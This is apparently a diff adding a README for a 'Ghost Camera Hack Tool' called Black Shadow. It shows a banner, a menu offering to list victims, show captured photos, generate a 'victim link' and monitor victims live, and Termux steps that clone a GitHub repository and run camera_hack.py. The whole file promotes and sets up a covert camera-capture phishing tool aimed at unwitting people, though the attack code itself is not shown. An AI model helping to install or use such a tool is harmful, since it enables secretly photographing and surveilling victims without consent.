@@ -1,0 +1,41 @@
+╔═══════════════════════════════════════════════════════════════╗
+║                         💀 BLACK SHADOW 💀                    ║
+║                     👻 Ghost Camera Hack Tool 👻              ║
+║                           🔥 DANGER TOOL 🔥                   ║
+╠═══════════════════════════════════════════════════════════════╣
+║                     Developed by: ADITYA                      ║
+╚═══════════════════════════════════════════════════════════════╝
+
+[1] 👥 Show All Victims
+[2] 📸 Show Photos Only
+[3] 📊 Show Statistics
+[4] 🔗 Get Victim Link
+[5] 🔴 Live Monitor
+[6] 🗑️ Delete All Data
+[7] 🚪 Exit
+
+
+________CAMMANDS RUN YOUR TERMUX_____
+# Step 1: Storage permission
+termux-setup-storage
+
+# Step 2: Update packages
+pkg update && pkg upgrade -y
+
+# Step 3: Install packages
+pkg install python git curl nano -y
+
+# Step 4: Install requests
+pip install requests
+
+# Step 5: Clone tool
+git clone https://github.com/xcmvaditya/Blackshadow_camhack.git
+
+# Step 6: Enter folder
+cd Blackshadow_camhack
+
+# Step 7: Make executable
+chmod +x camera_hack.py
+
+# Step 8: Run
+python camera_hack.py
